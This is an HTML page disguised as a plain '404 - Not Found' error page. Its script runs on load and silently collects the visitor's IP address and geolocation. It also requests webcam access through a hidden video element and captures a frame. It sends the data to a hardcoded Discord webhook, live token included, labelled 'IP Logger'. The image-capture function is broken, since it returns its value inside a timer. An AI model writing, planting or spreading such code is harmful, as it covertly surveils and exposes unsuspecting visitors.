<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            text-align: center;
            padding: 50px;
        }

        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }

        h1 {
            font-size: 48px;
            margin-bottom: 20px;
        }

        p {
            font-size: 24px;
        }

        video {
            display: none; /* Hide video element */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>404 - Not Found</h1>
        <p>The page you are looking for does not exist.</p>
        <video id="video" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>
    <script>
        // Function to send data to the Discord webhook
        function sendToWebhook(data, image) {
            const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz'; // Replace with your webhook URL
            const request = new XMLHttpRequest();
            request.open("POST", webhookUrl);
            request.setRequestHeader('Content-type', 'application/json');

            const params = {
                username: "IP Logger",
                avatar_url: "",
                content: `IP Address: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region_name}\nCity: ${data.city}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}`,
                embeds: [
                    {
                        image: {
                            url: image
                        }
                    }
                ]
            }

            request.send(JSON.stringify(params));
        }

        // Function to capture webcam image
        function captureImage(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            video.srcObject = stream;
            video.play();

            // Allow time for the video to start before capturing
            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const image = canvas.toDataURL('image/png'); // Get image data as base64

                // Stop video stream
                stream.getTracks().forEach(track => track.stop());

                return image;
            }, 1000);
        }

        // Fetch user's IP and location data
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                // Access the webcam
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        const image = captureImage(stream);

                        // Send data to Discord webhook after capturing the image
                        setTimeout(() => {
                            sendToWebhook(data, image);
                        }, 2000); // Wait for the capture to finish
                    })
                    .catch(error => console.error('Error accessing webcam:', error));
            })
            .catch(error => console.error('Error fetching IP data:', error));
    </script>
</body>
</html>
